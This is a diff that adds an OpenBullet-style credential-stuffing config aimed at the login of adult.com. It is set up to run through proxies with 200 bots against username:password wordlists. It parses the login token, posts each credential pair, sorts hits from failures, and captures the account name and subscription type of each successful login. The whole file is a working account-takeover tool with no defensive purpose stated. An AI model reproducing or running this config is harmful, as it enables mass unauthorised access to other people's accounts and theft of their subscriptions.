@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "Adult.com",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-14T14:52:57.9262316+01:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.adult.com/account/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"token\" value=\"" "\">" -> VAR "TK" 
+
+REQUEST POST "https://www.adult.com/account/login_json?token=<TK>" 
+  CONTENT "token=<TK>&loginPage=1&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.adult.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-GB,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: 268" 
+  HEADER "Origin: https://www.adult.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.adult.com/account/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username\\/password!" 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":\"1" 
+
+#Username PARSE "<SOURCE>" LR "\"username\":\"" "\"" CreateEmpty=FALSE -> CAP "Username" 
+
+#Subscription PARSE "<SOURCE>" LR "siteName\":\"" "\"" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#FREE KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "expiredPremiumUser\":true" 
+
